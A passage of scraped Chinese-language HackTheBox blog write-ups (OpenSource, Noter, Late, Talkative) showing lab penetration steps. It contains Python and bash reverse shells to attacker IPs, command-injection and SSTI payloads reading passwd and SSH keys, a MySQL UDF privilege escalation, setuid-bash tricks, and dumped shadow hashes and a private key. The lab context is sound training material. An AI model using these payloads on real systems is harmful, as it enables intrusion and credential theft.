提权信息运行pspy64,发现root权限定期的git 提交： 所以可以通过git hook来运行任意命令 提权 &amp; root flag修改一个可能被调用到的git hook,添加命令，等待触发，因为有防火墙，所以这里是给bash加suid： 12345# ~/.git/hooks/cp pre-commit.sample pre-commit# pre-commitchmod u+s /bin/bash shadow12root:$6$5sA85UVX$HupltM.bMqXkLc269pHDk1lryc4y5LV0FPMtT3x.yUdbe3mGziC8aUXWRQ2K3jX8mq5zItFAkAfDgPzH8EQ1C&#x2F;:19072:0:99999:7:::dev01:$6$KxPkBXel$7cqEmnerc0RmIaUGVdGLXlbC61.2x5bY0DLC&#x2F;j2VDHG3mAaqeWFfQiuHOXmQss91XNn0FybSdfl51vFfKuwRh&#x2F;:19073:0:99999:7::: 参考资料 OpenSource - HTB [Discussion] | BreachForumshttps://breached.co/Thread-OpenSource-HTB-Discussion HTB: OpenSource – Syn’s writeupshttps://synisl33t.com/2022/05/22/htb-opensource/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Noter - HackTheBox","slug":"Noter-HackTheBox","date":"2022-05-11T07:17:18.000Z","updated":"2022-09-05T00:45:37.883Z","comments":true,"path":"2022/05/11/Noter-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/05/11/Noter-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/467 10.10.11.160 端口扫描21,22,5000: 123456789101112131415161718$ nmap -sC -sV 10.10.11.160Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 13:19 CSTNmap scan report for 10.10.11.160Host is up (0.11s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)| 256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)|_ 256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)5000/tcp open http Werkzeug httpd 2.0.2 (Python 3.8.10)|_http-title: NoterService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 51.40 seconds 5000Flask写的note app： Noter注册登录,得到的cookie看起来像JWT，实际上根据flask可以知道是flask sign： 1eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibWlhbyJ9.YntLnA.yERWWVo5V4fLXiftDggYNLqSksI Flask-Unsign Paradoxis/Flask-Unsign: Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys.https://github.com/Paradoxis/Flask-Unsign 爆破出来密钥： 12345$ flask-unsign --unsign --cookie \"eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibWlhbyJ9.YntLnA.yERWWVo5V4fLXiftDggYNLqSksI\" --wordlist ~/Tools/dict/rockyou.txt --no-literal-eval[*] Session decodes to: &#123;'logged_in': True, 'username': 'miao'&#125;[*] Starting brute-forcer with 8 threads..[+] Found secret key after 17152 attemptsb'secret123' username根据密钥可以伪造任意cookie，但用户名并不是常规的admin之类，需要爆破一下，登录那里简单测试一下就可以知道能够枚举用户名，用户名存在和不存在的响应不同： 用户名字典用seclist里的cirt-default-usernames.txt就可以： blue生成blue的cookie，替换登录： 12$ flask-unsign --sign --cookie \"&#123;'logged_in': True, 'username': 'blue'&#125;\" --secret 'secret123'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YntP4g.ljsRVa4c5NTGAVwcUYGlpihL1Tc notesblue的notes里得到ftp密码： 1Your username is &#39;blue&#39; and the password is &#39;blue@Noter!&#39;. FTP使用得到的账号密码登录ftp，可以得到一个pdf文件： policy.pdf是密码策略相关，里面给出了默认密码的生成规则： 可以根据该规则得出ftp_admin的默认密码： 1ftp_admin@Noter! ftp_admin使用ftp_admin账号密码登录，可以得到两个备份文件： app_backup 对比两个版本文件差异，可以得到数据库账号密码信息： 12rootNildogg36 命令注入另外进行代码审计也可以很容易发现export_note_remote存在命令注入, 请求用户指定的url，响应信息拼接到command里 123456url = request.form['url']r = pyrequest.get(url,allow_redirects=True)rand_int = random.randint(1,10000)command = f\"node misc/md-to-pdf.js $'&#123;r.text.strip()&#125;' &#123;rand_int&#125;\"subprocess.run(command, shell=True, executable=\"/bin/bash\") export_note_remote123456789101112131415161718192021222324252627282930313233343536# Export remote@app.route('/export_note_remote', methods=['POST'])@is_logged_indef export_note_remote(): if check_VIP(session['username']): try: url = request.form['url'] status, error = parse_url(url) if (status is True) and (error is None): try: r = pyrequest.get(url,allow_redirects=True) rand_int = random.randint(1,10000) command = f\"node misc/md-to-pdf.js $'&#123;r.text.strip()&#125;' &#123;rand_int&#125;\" subprocess.run(command, shell=True, executable=\"/bin/bash\") if os.path.isfile(attachment_dir + f'&#123;str(rand_int)&#125;.pdf'): return send_file(attachment_dir + f'&#123;str(rand_int)&#125;.pdf', as_attachment=True) else: return render_template('export_note.html', error=\"Error occured while exporting the !\") except Exception as e: return render_template('export_note.html', error=\"Error occured!\") else: return render_template('export_note.html', error=f\"Error occured while exporting ! (&#123;error&#125;)\") except Exception as e: return render_template('export_note.html', error=f\"Error occured while exporting ! (&#123;e&#125;)\") else: abort(403) 命令注入 &amp; user flag就是根据分析结果那样，提交url，控制响应内容进行命令注入，getshell： shell.md1&#39;;python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.3&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; # &#39; user flagsvc用户目录得到user.txt: UDF提权 &amp; root flag写公钥进去后ssh登录，方便后续操作,因为前面得到有数据库账号密码还没有使用到，这里很容易想到相关的UDF： MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2) - Linux local Exploithttps://www.exploit-db.com/exploits/1518 so路径要改成对应的，另外因为这个udf没回显，所以要通过文件查看执行结果,方便操作就直接bash加suid了： 1234567891011121314gcc -g -c raptor_udf2.cgcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lcshow variables like '%plugin%';/usr/lib/x86_64-linux-gnu/mariadb19/plugin/create table foo(line blob);insert into foo values(load_file('/tmp/raptor_udf2.so'));select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';create function do_system returns integer soname 'raptor_udf2.so';select * from mysql.func;select do_system('id&gt; /tmp/out; chown svc /tmp/out');select do_system('chmod u+s /bin/bash'); root flag shadow1234root:$6$09RSjU3jIh&#x2F;2JW1u$8jlcYzW5Oyzgh&#x2F;TrlTPX5Wq2HMTA6zUooij&#x2F;9j0.NIttTYp4x0h6wmq8chrcdtvNpZzHlHzwsI8GesOKI3NYn.:18991:0:99999:7:::svc:$6$gTM.AIsgDue4r5AQ$wUBfUtg7&#x2F;svAcRTnsFv51KuMpeNP0cL6vqIR3608pzd0YsNNe0oxMwvY7iAGMCgMp7viiBLUwUaAZx4r6ljME&#x2F;:18988:0:99999:7:::ftp_admin:$6$gQyFQc6w7p83bBwZ$6zYRlPKPBp6GMgUI5mbojxOvyup7hqrQ5hfscnLkwvIimC6qO5a0taiju1vYQPSnzf.mO5TgCdo.5RiO9Gu7J0:19114:0:99999:7:::blue:$6$pNud9u&#x2F;1PdD8qPYi$cSe5FPCRGH5xjUiEMJ5tXSclSrWSz7gimtR2IcXiiVk0xNfSACcVgU3C4z69RnZHEQKrNO&#x2F;hIiUQdVTqlxb29.:19114:0:99999:7::: 参考资料 Paradoxis/Flask-Unsign: Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys.https://github.com/Paradoxis/Flask-Unsign MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2) - Linux local Exploithttps://www.exploit-db.com/exploits/1518 Noter - HTB [Discussion] | BreachForumshttps://breached.co/Thread-Noter-HTB-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Late - HackTheBox","slug":"Late-HackTheBox","date":"2022-04-26T07:11:22.000Z","updated":"2022-08-01T08:46:18.796Z","comments":true,"path":"2022/04/26/Late-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/04/26/Late-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/463 10.10.11.156 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV 10.10.11.156Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-26 13:58 CSTNmap scan report for 10.10.11.156Host is up (0.13s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)| 256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)|_ 256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-title: Late - Best online image tools|_http-server-header: nginx/1.14.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 57.35 seconds 80在线图像工具： images.late.htb页面链接域名加hosts,是一个在线OCR： 110.10.11.156 images.late.htb SSTI因为是flask做的OCR，很容易想到SSTI，测试成功 （字体坑比较大，多试几个不同的）： 后面就是通过SSTI读文件，读取用户私钥： 一个好的方法，直接修改网页上文字然后截图识别： 123&#123;&#123; get_flashed_messages.__globals__.__builtins__.open(&quot;&#x2F;etc&#x2F;passwd&quot;).read() &#125;&#125;&#123;&#123; get_flashed_messages.__globals__.__builtins__.open(&quot;&#x2F;home&#x2F;svc_acc&#x2F;.ssh&#x2F;id_rsa&quot;).read() &#125;&#125; svc_acc_id_rsa123456789101112131415161718192021222324252627-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF&#x2F;P&#x2F;3Tn+fiAUHhnGvBBAyrMHiP3S&#x2F;DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T&#x2F;nTa3PSuR9tkiqhXTaEObgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi&#x2F;mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS&#x2F;AnE&#x2F;B2Eelj1shYUZuPyIoLhSMicGnhB77IKpZeQ+MgksRcHJ5fJ2hvTu&#x2F;T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLMfLSmimptq&#x2F;1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0ppJp5a+&#x2F;OPwDJXus5lKv9MtCaBidR9&#x2F;vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgzW0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk&#x2F;c7aHYw6GQKhoN1en&#x2F;7I50IZuFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwCT9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IHQl49ezkCgYEA0OTVbOT&#x2F;EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troiWEBJ3pvIsrUlLd9J3cY7ciRxnbanN&#x2F;Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7NgHr4+hcK+SYNn5fCX5qjmzE6c&#x2F;5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7t4UB&#x2F;PaoU0+kz1dNDEyNamSe5mXh&#x2F;Hc&#x2F;mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP&#x2F;knKxHIEuJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k&#x2F;1pQGUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8Fry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP&#x2F;INltncJPRlfkj2MpvHJfUXGhMbVh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfrkr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oALK6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc&#x2F;jSk0kxruFUgLHh7nEx&#x2F;5&#x2F;0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw&#x3D;&#x3D;-----END RSA PRIVATE KEY----- ssti成因分析看了下代码，是直接把得到的text format到结果里然后render了： 123456...pytesseract.pytesseract.tesseract_cmd = r'/usr/bin/tesseract'scanned_text = pytesseract.image_to_string(PIL.Image.open(file_name))results = \"\"\"&lt;p&gt;&#123;&#125;&lt;/p&gt;\"\"\".format(scanned_text)r = render_template_string(results)... user flag使用得到的私钥登录，user.txt: 提权信息运行linpeas，pspy之类可以发现/usr/local/sbin/ssh-alert.sh文件以root权限运行，我们可以控制这个文件，这个文件是向root发送ssh登录信息，所以可以通过ssh来触发命令执行 ssh-alert.sh12345678910111213141516171819#!/bin/bashRECIPIENT=\"root@late.htb\"SUBJECT=\"Email from Server Login: SSH Alert\"BODY=\"A SSH login was detected. User: $PAM_USER User IP Host: $PAM_RHOST Service: $PAM_SERVICE TTY: $PAM_TTY Date: `date` Server: `uname -a`\"if [ $&#123;PAM_TYPE&#125; = \"open_session\" ]; then echo \"Subject:$&#123;SUBJECT&#125; $&#123;BODY&#125;\" | /usr/sbin/sendmail $&#123;RECIPIENT&#125;fi 提权 &amp;&amp; root flag1echo &quot;chmod u+s &#x2F;bin&#x2F;bash&quot; &gt;&gt; &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;ssh-alert.sh shadow12root:$6$a6J2kmTW$cHVk8PYFcAiRyUOA38Cs1Eatrz48yp395Cmi7Fxszl&#x2F;aqQooB.6qFmhMG1LYuHJpGvvaE1cxubWIdIc1znRJi.:19089:0:99999:7:::svc_acc:$6$&#x2F;WRA.GuP$fusYGh.OucHDQzn5.9XdFMO6hcVw7ayD1B9&#x2F;MVrxKFyv0PDd51.3JUA9qgQMU1Mnvlfjw9xSDb98B1xMwdtZH.:19008:0:99999:7::: cron.sh查看root目录下scripts中文件，可以看到定时还原和情理 1234567891011#!/bin/bash# Adding alert filechattr -a /usr/local/sbin/ssh-alert.shrm /usr/local/sbin/ssh-alert.shcp /root/scripts/ssh-alert.sh /usr/local/sbin/ssh-alert.shchmod +x /usr/local/sbin/ssh-alert.shchown svc_acc:svc_acc /usr/local/sbin/ssh-alert.shrm -r /home/svc_acc/app/uploads/* 2&gt;/dev/nullrm -r /home/svc_acc/app/misc/* 2&gt;/dev/nullchattr +a /usr/local/sbin/ssh-alert.sh 参考资料 PayloadsAllTheThings/README.md at master · swisskyrepo/PayloadsAllTheThingshttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md HTB Late [Discussion] | BreachForumshttps://breached.co/Thread-HTB-Late-Discussion Hackthebox - Late 靶场实战https://mp.weixin.qq.com/s/go5LD7bXtoTwc0QtBfb65w","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Talkative - HackTheBox","slug":"Talkative-HackTheBox","date":"2022-04-21T07:38:20.000Z","updated":"2022-08-29T01:26:03.143Z","comments":true,"path":"2022/04/21/Talkative-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/04/21/Talkative-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/458 10.10.11.155 端口扫描22,80,3000,8080,8081,8082,注意22被防火墙过滤了，外部用不了: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108$ nmap -sC -sV 10.10.11.155Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-21 13:35 CSTNmap scan report for 10.10.11.155Host is up (0.22s latency).Not shown: 994 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp filtered ssh80/tcp open http Apache httpd 2.4.52|_http-server-header: Apache/2.4.52 (Debian)|_http-title: Did not follow redirect to http://talkative.htb3000/tcp open ppp?| fingerprint-strings:| GetRequest:| HTTP/1.1 200 OK| X-XSS-Protection: 1| X-Instance-ID: W8u2yS8skXBJ9hTgb| Content-Type: text/html; charset=utf-8| Vary: Accept-Encoding| Date: Thu, 21 Apr 2022 05:36:17 GMT| Connection: close| &lt;!DOCTYPE html&gt;| &lt;html&gt;| &lt;head&gt;| &lt;link rel=\"stylesheet\" type=\"text/css\" class=\"__meteor-css__\" href=\"/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true\"&gt;| &lt;meta charset=\"utf-8\" /&gt;| &lt;meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\" /&gt;| &lt;meta http-equiv=\"expires\" content=\"-1\" /&gt;| &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt;| &lt;meta name=\"fragment\" content=\"!\" /&gt;| &lt;meta name=\"distribution\" content=\"global\" /&gt;| &lt;meta name=\"rating\" content=\"general\" /&gt;| &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\" /&gt;| &lt;meta name=\"mobile-web-app-capable\" content=\"yes\" /&gt;| &lt;meta name=\"apple-mobile-web-app-capable\" conten| HTTPOptions:| HTTP/1.1 200 OK| X-XSS-Protection: 1| X-Instance-ID: W8u2yS8skXBJ9hTgb| Content-Type: text/html; charset=utf-8| Vary: Accept-Encoding| Date: Thu, 21 Apr 2022 05:36:19 GMT| Connection: close| &lt;!DOCTYPE html&gt;| &lt;html&gt;| &lt;head&gt;| &lt;link rel=\"stylesheet\" type=\"text/css\" class=\"__meteor-css__\" href=\"/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true\"&gt;| &lt;meta charset=\"utf-8\" /&gt;| &lt;meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\" /&gt;| &lt;meta http-equiv=\"expires\" content=\"-1\" /&gt;| &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt;| &lt;meta name=\"fragment\" content=\"!\" /&gt;| &lt;meta name=\"distribution\" content=\"global\" /&gt;| &lt;meta name=\"rating\" content=\"general\" /&gt;| &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\" /&gt;| &lt;meta name=\"mobile-web-app-capable\" content=\"yes\" /&gt;| &lt;meta name=\"apple-mobile-web-app-capable\" conten| Help, NCP:|_ HTTP/1.1 400 Bad Request8080/tcp open http Tornado httpd 5.0|_http-server-header: TornadoServer/5.0|_http-title: jamovi8081/tcp open http Tornado httpd 5.0|_http-server-header: TornadoServer/5.0|_http-title: 404: Not Found8082/tcp open http Tornado httpd 5.0|_http-server-header: TornadoServer/5.0|_http-title: 404: Not Found1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3000-TCP:V=7.92%I=7%D=4/21%Time=6260ED52%P=x86_64-apple-darwin20.4.SF:0%r(GetRequest,31BA,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-XSS-Protection:\\x201\\rSF:\\nX-Instance-ID:\\x20W8u2yS8skXBJ9hTgb\\r\\nContent-Type:\\x20text/html;\\x2SF:0charset=utf-8\\r\\nVary:\\x20Accept-Encoding\\r\\nDate:\\x20Thu,\\x2021\\x20ApSF:r\\x202022\\x2005:36:17\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!DOCTYPE\\xSF:20html&gt;\\n&lt;html&gt;\\n&lt;head&gt;\\n\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20type=\\\"SF:text/css\\\"\\x20class=\\\"__meteor-css__\\\"\\x20href=\\\"/3ab95015403368c507c78SF:b4228d38a494ef33a08\\.css\\?meteor_css_resource=true\\\"&gt;\\n&lt;meta\\x20charsetSF:=\\\"utf-8\\\"\\x20/&gt;\\n\\t&lt;meta\\x20http-equiv=\\\"content-type\\\"\\x20content=\\\"tSF:ext/html;\\x20charset=utf-8\\\"\\x20/&gt;\\n\\t&lt;meta\\x20http-equiv=\\\"expires\\\"\\xSF:20content=\\\"-1\\\"\\x20/&gt;\\n\\t&lt;meta\\x20http-equiv=\\\"X-UA-Compatible\\\"\\x20coSF:ntent=\\\"IE=edge\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=\\\"fragment\\\"\\x20content=\\\"!\\\"\\SF:x20/&gt;\\n\\t&lt;meta\\x20name=\\\"distribution\\\"\\x20content=\\\"global\\\"\\x20/&gt;\\n\\tSF:&lt;meta\\x20name=\\\"rating\\\"\\x20content=\\\"general\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=SF:\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-scale=1,\\x20maSF:ximum-scale=1,\\x20user-scalable=no\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=\\\"mobile-weSF:b-app-capable\\\"\\x20content=\\\"yes\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=\\\"apple-mobilSF:e-web-app-capable\\\"\\x20conten\")%r(Help,1C,\"HTTP/1\\.1\\x20400\\x20Bad\\x20RSF:equest\\r\\n\\r\\n\")%r(NCP,1C,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\n\\r\\n\")SF:%r(HTTPOptions,31BA,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-XSS-Protection:\\x201\\rSF:\\nX-Instance-ID:\\x20W8u2yS8skXBJ9hTgb\\r\\nContent-Type:\\x20text/html;\\x2SF:0charset=utf-8\\r\\nVary:\\x20Accept-Encoding\\r\\nDate:\\x20Thu,\\x2021\\x20ApSF:r\\x202022\\x2005:36:19\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!DOCTYPE\\xSF:20html&gt;\\n&lt;html&gt;\\n&lt;head&gt;\\n\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20type=\\\"SF:text/css\\\"\\x20class=\\\"__meteor-css__\\\"\\x20href=\\\"/3ab95015403368c507c78SF:b4228d38a494ef33a08\\.css\\?meteor_css_resource=true\\\"&gt;\\n&lt;meta\\x20charsetSF:=\\\"utf-8\\\"\\x20/&gt;\\n\\t&lt;meta\\x20http-equiv=\\\"content-type\\\"\\x20content=\\\"tSF:ext/html;\\x20charset=utf-8\\\"\\x20/&gt;\\n\\t&lt;meta\\x20http-equiv=\\\"expires\\\"\\xSF:20content=\\\"-1\\\"\\x20/&gt;\\n\\t&lt;meta\\x20http-equiv=\\\"X-UA-Compatible\\\"\\x20coSF:ntent=\\\"IE=edge\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=\\\"fragment\\\"\\x20content=\\\"!\\\"\\SF:x20/&gt;\\n\\t&lt;meta\\x20name=\\\"distribution\\\"\\x20content=\\\"global\\\"\\x20/&gt;\\n\\tSF:&lt;meta\\x20name=\\\"rating\\\"\\x20content=\\\"general\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=SF:\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-scale=1,\\x20maSF:ximum-scale=1,\\x20user-scalable=no\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=\\\"mobile-weSF:b-app-capable\\\"\\x20content=\\\"yes\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=\\\"apple-mobilSF:e-web-app-capable\\\"\\x20conten\");Service Info: Host: 172.17.0.18Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 85.53 seconds 80需要加hosts 110.10.11.155 talkative.htb Bolt cms: 3000rocket chat: 8080jamovi 0.9.5.5: 8081/8082直接访问是404: Not Found jamovi8080的jamovi,可以直接运行R语言代码，是在一个容器中： 12system(\"bash -c 'id &amp;&amp; hostname'\", intern = TRUE) system(\"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.14/4444 0&gt;&amp;1'\",intern=TRUE) bolt-administration.omv/root目录有个bolt-administration.omv文件，下载下来分析,容器不方便下载操作，可以直接base64,omv就是zip文件，直接解压,解压出来的文件中，xdata.json里得到几组账号密码： 1234base64 bolt-administration.omvecho xxxx | base64 -d &gt; bolt-administration.omvunzip bolt-administration.omv xdata.json12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&#123; \"A\": &#123; \"labels\": [ [ 0, \"Username\", \"Username\", false ], [ 1, \"matt@talkative.htb\", \"matt@talkative.htb\", false ], [ 2, \"janit@talkative.htb\", \"janit@talkative.htb\", false ], [ 3, \"saul@talkative.htb\", \"saul@talkative.htb\", false ] ] &#125;, \"B\": &#123; \"labels\": [ [ 0, \"Password\", \"Password\", false ], [ 1, \"jeO09ufhWD&lt;s\", \"jeO09ufhWD&lt;s\", false ], [ 2, \"bZ89h&#125;V&lt;S_DA\", \"bZ89h&#125;V&lt;S_DA\", false ], [ 3, \")SQWGm&gt;9KHEA\", \")SQWGm&gt;9KHEA\", false ] ] &#125;, \"C\": &#123; \"labels\": [] &#125;&#125; Bolt cms根据已知信息，80是bolt cms，得到的密码信息是bolt-administration，所以回到80,bolt cms默认登陆路径尝试复用密码,成功登录，Bolt version 5.1.3： 123http:&#x2F;&#x2F;talkative.htb&#x2F;bolt&#x2F;loginadmin : jeO09ufhWD&lt;s 后台直接修改php文件，得到另一个容器www-data shell： setting -&gt; configxxxx -&gt; all configxxx files,进去修改php文件,然后访问任意页面触发： 1http:&#x2F;&#x2F;talkative.htb&#x2F;bolt&#x2F;file-edit&#x2F;config?file&#x3D;&#x2F;bundles.php 升级tty，没有python，可以这样升： 1script -qc &#x2F;bin&#x2F;bash &#x2F;dev&#x2F;null user flag容器内可以ssh连接到宿主机，复用前面得到的那些账号密码： 1234script -qc /bin/bash /dev/nullssh saul@10.10.11.155jeO09ufhWD&lt;s mongo运行pspy可以发现mongo相关，检查发现mongo是另一个容器： 1234567892022/04/09 21:31:01 CMD: UID=0 PID=79640 | /bin/sh -c cp /root/.backup/passwd /etc/passwd 2022/04/09 21:31:01 CMD: UID=0 PID=84170 | cp /root/.backup/shadow /etc/shadow 2022/04/09 21:51:01 CMD: UID=0 PID=84169 | python3 /root/.backup/update_mongo.py 2022/04/09 21:51:01 CMD: UID=0 PID=84172 | python3 /root/.backup/update_mongo.pysaul@talkative:~/.ssh$ netstat -ano | grep 27017netstat -ano | grep 27017tcp 0 0 172.17.0.1:42930 172.17.0.2:27017 TIME_WAIT timewait (44.67/0/0)tcp 0 0 172.17.0.1:42928 172.17.0.2:27017 TIME_WAIT timewait (44.67/0/0) 转发端口，枚举数据库，其中得到rocket.cat相关信息,密码破解不出来，但可以修改为已知明文的密文： 123456789101112131415161718192021# remotewget 10.10.14.14:7777/chisel_1.7.6_linux_amd64./chisel_1.7.6_linux_amd64 client 10.10.14.14:6969 R:27017:172.17.0.2:27017 # local ./chisel_1.7.0-rc7_darwin_amd64 server -p 6969 --reverse # mongobrew install mongoshmongosh \"mongodb://LOCALHOST:27017\"show databasesuse adminshow tablesdb.system.keys.find()use meteorshow tablesdb.users.find()# 明文 12345db.getCollection('users').update(&#123;username:\"admin\"&#125;, &#123; $set: &#123;\"services\" : &#123; \"password\" : &#123;\"bcrypt\" : \"$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG\" &#125; &#125; &#125; &#125;) Rocket.Chat使用修改后的密码登录3000端口的Rocket.Chat，版本2.4.14： 搜到相关漏洞： CsEnox/CVE-2021-22911: Pre-Auth Blind NoSQL Injection leading to Remote Code Execution in Rocket Chat 3.12.1https://github.com/CsEnox/CVE-2021-22911 CVE-2021-22911集成(integrations) webhook运行自定义nodejs代码,添加之后得到调用的curl命令，运行触发,得到该容器root： 1curl -X POST -H 'Content-Type: application/json' --data '&#123;\"username\":\"miao\",\"text\":\"Example message\",\"attachments\":[&#123;\"title\":\"Rocket.Chat\",\"title_link\":\"https://rocket.chat\",\"text\":\"Rocket.Chat, the best open source chat\",\"image_url\":\"/images/integration-attachment-example.png\",\"color\":\"#764FA5\"&#125;]&#125;' 